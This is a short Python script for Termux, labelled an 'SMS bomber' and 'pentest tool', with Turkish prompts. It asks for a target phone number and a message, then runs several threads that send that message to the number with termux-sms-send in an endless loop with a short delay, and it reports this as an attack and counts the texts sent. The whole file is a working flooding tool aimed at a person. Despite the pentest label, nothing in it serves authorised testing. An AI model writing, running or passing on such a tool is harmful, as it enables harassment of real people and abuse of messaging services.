#!/usr/bin/env python3
import subprocess, threading, time, random, os
os.system('clear')
print("🔥 TERMUX SMS BOMBER v2.0 - PENTEST TOOL 🔥")
print("="*50)

target = input("🎯 Hedef Numara (+90): ")
message = input("📱 Mesaj: ")
threads = int(input("⚡ Thread Sayısı (10): ") or 10)
delay = float(input("⏱️ Delay (s) (0.5): ") or 0.5)

count = 0
lock = threading.Lock()

def send_sms():
    global count
    while True:
        try:
            cmd = ['termux-sms-send', '-n', target, message]
            subprocess.run(cmd, capture_output=True, check=True)
            with lock:
                count += 1
                print(f"✅ [{count}] SMS GÖNDERİLDİ → {target}")
            time.sleep(delay + random.uniform(0, 0.3))
        except:
            time.sleep(1)

print(f"\n🚀 SALDIRI BAŞLIYOR!")
print(f"   📱 Hedef: {target}")
print(f"   ⚡ Thread: {threads}")
print(f"   ⏱️ Delay: {delay}s")
print("💀 Ctrl+C ile DURDUR")
print("="*50)

threads_list = []
for i in range(threads):
    t = threading.Thread(target=send_sms, daemon=True)
    t.start()
    threads_list.append(t)

try:
    while True:
        time.sleep(1)
        print(f"📊 TOPLAM SMS: {count}", end='\r')
except KeyboardInterrupt:
    print(f"\n\n💀 SALDIRI DURDURULDU!")
    print(f"📊 TOPLAM GÖNDERİLEN: {count} SMS")
    print("✅ PENTEST TAMAMLANDI!")  
